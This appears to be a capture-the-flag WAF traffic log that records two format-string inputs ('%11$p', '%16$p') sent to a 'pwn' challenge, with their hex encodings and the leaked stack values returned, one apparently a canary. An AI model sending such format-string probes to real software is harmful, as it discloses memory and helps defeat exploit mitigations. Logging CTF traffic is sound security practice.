// Date: 2021-11-27 03:07:44
// SKYCTF PWN WAF
// Deved By I0gan
team_name: 划水队

user_name: solo


<-------------------- read ------------------>
%11$p

r_0 = "\x25\x31\x31\x24\x70\x0a"

<-------------------- write ----------------->
0xeb951bc24c3e8400
--+--

w_0 = "\x30\x78\x65\x62\x39\x35\x31\x62\x63\x32\x34\x63\x33\x65\x38\x34\x30\x30\x0a\x2d\x2d\x2b\x2d\x2d\x0a"

<-------------------- read ------------------>
%16$p

r_1 = "\x25\x31\x36\x24\x70\x0a"

<-------------------- write ----------------->
0x17cb34ca0
logger: chall env released
logger: sky_token_is_wrong

w_1 = "\x30\x78\x31\x37\x63\x62\x33\x34\x63\x61\x30\x0a"
